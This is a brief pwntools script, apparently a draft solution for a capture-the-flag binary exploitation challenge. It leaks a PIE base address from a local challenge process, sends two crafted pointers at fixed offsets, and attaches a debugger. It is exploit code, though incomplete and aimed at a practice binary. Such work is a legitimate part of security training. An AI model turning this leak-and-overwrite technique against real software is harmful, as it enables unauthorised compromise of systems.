#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

#r = remote(HOST, int(PORT))
r = process('./challenge_patched')

pie_leak = r.recv(7) + b'\x00'
pie_leak = u64(pie_leak)
log.info(f"pie leak: {hex(pie_leak)}")
r.sendline(p64(pie_leak + 0x45a8)+p64(pie_leak+0x4590))
#r.sendline("AAAA")
gdb.attach(r)

r.interactive()
